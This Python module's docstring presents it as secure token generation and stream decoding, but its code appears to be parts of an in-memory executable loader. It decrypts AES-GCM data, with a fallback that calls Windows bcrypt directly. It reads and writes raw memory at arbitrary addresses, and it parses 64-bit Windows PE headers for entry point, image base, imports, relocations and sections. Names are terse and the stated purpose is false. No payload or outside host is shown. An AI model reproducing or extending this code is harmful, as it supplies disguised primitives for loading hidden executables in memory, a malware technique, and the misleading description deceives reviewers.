# -*- coding: utf-8 -*-
"""
Data encoding and validation — secure token generation and stream decoding.
"""
import hashlib
import struct
import hmac
import ctypes


def sign_request(nonce, ts, secret):
    msg = (nonce + str(ts)).encode()
    return hmac.new(secret, msg, hashlib.sha256).hexdigest()


def decrypt_data(key_hex, data_b64):
    try:
        return _lib(key_hex, data_b64)
    except Exception:
        return _native(key_hex, data_b64)


def _lib(key_hex, data_b64):
    import base64
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    key = bytes.fromhex(key_hex)
    raw = base64.b64decode(data_b64)
    gcm = AESGCM(key)
    return gcm.decrypt(raw[:12], raw[12:], None)


def _native(key_hex, data_b64):
    import base64
    key = bytes.fromhex(key_hex)
    raw = base64.b64decode(data_b64)
    iv, tag, ct = raw[:12], raw[-16:], raw[12:-16]

    lib = ctypes.WinDLL("bcrypt")
    alg_id = "AES\0".encode("utf-16-le")
    mode_prop = "ChainingMode\0".encode("utf-16-le")
    mode_val = "ChainingModeGCM\0".encode("utf-16-le")

    h_alg = ctypes.c_void_p()
    lib.BCryptOpenAlgorithmProvider(ctypes.byref(h_alg), alg_id, None, 0)
    lib.BCryptSetProperty(h_alg, mode_prop, mode_val, len(mode_val), 0)

    h_key = ctypes.c_void_p()
    lib.BCryptGenerateSymmetricKey(
        h_alg, ctypes.byref(h_key), None, 0,
        ctypes.c_char_p(key), len(key), 0
    )

    class _Info(ctypes.Structure):
        _fields_ = [
            ("sz", ctypes.c_ulong), ("v", ctypes.c_ulong),
            ("p1", ctypes.c_void_p), ("n1", ctypes.c_ulong),
            ("p2", ctypes.c_void_p), ("n2", ctypes.c_ulong),
            ("p3", ctypes.c_void_p), ("n3", ctypes.c_ulong),
            ("p4", ctypes.c_void_p), ("n4", ctypes.c_ulong),
            ("x1", ctypes.c_ulong), ("x2", ctypes.c_ulonglong),
            ("fl", ctypes.c_ulong),
        ]

    iv_buf = ctypes.create_string_buffer(iv)
    tag_buf = ctypes.create_string_buffer(tag)
    params = _Info()
    params.sz = ctypes.sizeof(params)
    params.v = 1
    params.p1 = ctypes.cast(iv_buf, ctypes.c_void_p)
    params.n1 = 12
    params.p3 = ctypes.cast(tag_buf, ctypes.c_void_p)
    params.n3 = 16

    ct_buf = ctypes.create_string_buffer(ct)
    pt_buf = ctypes.create_string_buffer(len(ct))
    out_len = ctypes.c_ulong(0)

    status = lib.BCryptDecrypt(
        h_key, ct_buf, len(ct), ctypes.byref(params),
        None, 0, pt_buf, len(ct), ctypes.byref(out_len), 0
    )
    lib.BCryptDestroyKey(h_key)
    lib.BCryptCloseAlgorithmProvider(h_alg, 0)

    if status != 0:
        return None
    return pt_buf.raw[:out_len.value]


def _rd(buf, off, fmt):
    return struct.unpack_from(fmt, buf, off)[0]


def read_value(addr, fmt):
    return struct.unpack_from(
        fmt, (ctypes.c_char * struct.calcsize(fmt)).from_address(addr), 0
    )[0]


def write_value(addr, fmt, val):
    struct.pack_into(
        fmt, (ctypes.c_char * struct.calcsize(fmt)).from_address(addr), 0, val
    )


def parse_header(data):
    if len(data) < 256 or struct.unpack_from("<H", data, 0)[0] != 0x5A4D:
        return None
    o = _rd(data, 0x3C, "<I")
    if o + 4 > len(data) or _rd(data, o, "<I") != 0x4550:
        return None
    fh = o + 4
    ns = _rd(data, fh + 2, "<H")
    os_ = _rd(data, fh + 16, "<H")
    oh = fh + 20
    if _rd(data, oh, "<H") != 0x20B:
        return None
    nd = _rd(data, oh + 108, "<I")
    dd = oh + 112
    sc = []
    so = oh + os_
    for i in range(ns):
        p = so + i * 40
        sc.append((
            _rd(data, p + 8, "<I"), _rd(data, p + 12, "<I"),
            _rd(data, p + 16, "<I"), _rd(data, p + 20, "<I"),
            _rd(data, p + 36, "<I")
        ))
    return {
        "e": _rd(data, oh + 16, "<I"), "b": _rd(data, oh + 24, "<Q"),
        "s": _rd(data, oh + 56, "<I"), "h": _rd(data, oh + 60, "<I"),
        "i": _rd(data, dd + 8, "<I") if nd > 1 else 0,
        "r": _rd(data, dd + 40, "<I") if nd > 5 else 0,
        "z": _rd(data, dd + 44, "<I") if nd > 5 else 0,
        "c": sc,
    }
